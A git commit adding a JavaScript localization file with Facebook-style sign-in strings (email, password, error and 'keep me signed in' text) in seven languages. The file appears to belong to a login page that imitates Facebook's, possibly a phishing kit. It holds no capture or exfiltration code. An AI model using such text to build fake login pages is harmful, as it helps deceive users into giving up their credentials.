a40c117a1e7cc6e737500fa1f3fcc4f89f06e6ce
ZAXAR <75692181+zaxarspy@users.noreply.github.com>
2021-03-24 01:04:41 +0200

    Create lang.js

---
+++ lang/m/lang.js
@@ -0,0 +1,73 @@
+    //languages Objects
+    var rtllang = ["AR", "UR"];
+    var WORDS_EN = {
+        "text1": "Instantly connect with people in your life.",
+        "text2": "Sign in with Facebook to get started.",
+        "text3": "Incorrect email or phone number.",
+        "text4": "The password you entered is incorrect.",
+        "text5": "Email address or phone number",
+        "text6": "Password",
+        "text7": "Continue",
+        "text8": "Keep me signed in",
+    };
+    var WORDS_AR = {
+        "text1": "يمكنك التواصل فورًا مع الأشخاص الموجودين في حياتك",
+        "text2": "تسجيل الدخول بحساب ‏‎Facebook‎‏ لبدء الاستخدام",
+        "text3": "البريد الإلكتروني أو رقم الهاتف غير صحيح.",
+        "text4": "كلمة المرور التي أدخلتها غير صحيحة.",
+        "text5": "البريد الالكتروني او رقم الهاتف",
+        "text6": "كلمه السر",
+        "text7": "متابعة",
+        "text8": "البقاء قيد تسجيل الدخول",
+    };
+    var WORDS_FR = {
+        "text1": "Connectez-vous instantanément avec les personnes de votre vie.",
+        "text2": "Connectez-vous avec Facebook pour commencer.",
+        "text3": "Adresse e-mail ou numéro de téléphone incorrect.",
+        "text4": "Le mot de passe que vous avez entré est incorrect.",
+        "text5": "Adresse e-mail ou numéro de téléphone",
+        "text6": "Mot de passe",
+        "text7": "Continuez",
+        "text8": "Gardez-moi connecté",
+    };
+    var WORDS_UR = {
+        "text1": "اپنی زندگی میں لوگوں سے فوری رابطہ کریں۔",
+        "text2": "شروع کرنے کے لئے فیس بک کے ساتھ سائن ان کریں۔",
+        "text3": "غلط ای میل یا فون نمبر۔",
+        "text4": "آپ کا درج کردہ پاس ورڈ غلط ہے",
+        "text5": "ای میل ایڈریس یا فون نمبر",
+        "text6": "پاس ورڈ",
+        "text7": "جاری رہے",
+        "text8": "مجھے سائن ان رکھیں",
+    };
+
+    var WORDS_FIL = {
+        "text1": "Agad na kumonekta sa mga tao sa iyong buhay.",
+        "text2": "Mag-sign in gamit ang Facebook upang makapagsimula.",
+        "text3": "Maling email o numero ng telepono.",
+        "text4": "Ang password na iyong inilagay ay mali.",
+        "text5": "Email address o numero ng telepono",
+        "text6": "Password",
+        "text7": "Magpatuloy",
+        "text8": "Panatilihin akong naka-sign in",
+    };
+    var WORDS_ES = {
+        "text1": "Conéctese instantáneamente con personas en su vida.",
+        "text2": "Inicie sesión con Facebook para comenzar.",
+        "text3": "Correo electrónico o número de teléfono incorrectos.",
+        "text4": "La contraseña que ha ingresado es incorrecta.",
+        "text5": "Dirección de correo electrónico o número de teléfono",
+        "text6": "Contraseña",
+        "text7": "Continuar",
+        "text8": "Mantenerme registrado",
+    };
+    var WORDS_PT = {
+        "text1": "Conecte-se instantaneamente com as pessoas em sua vida.",
+        "text2": "Faça login no Facebook para começar.",
+        "text3": "E-mail ou número de telefone incorreto.",
+        "text4": "A senha que você digitou está incorreta.",
+        "text5": "Endereço de e-mail ou número de telefone",
+        "text6": "Senha",
+        "text7": "Continuar",
+        "text8": "Mantenha-me conectado",
+    };
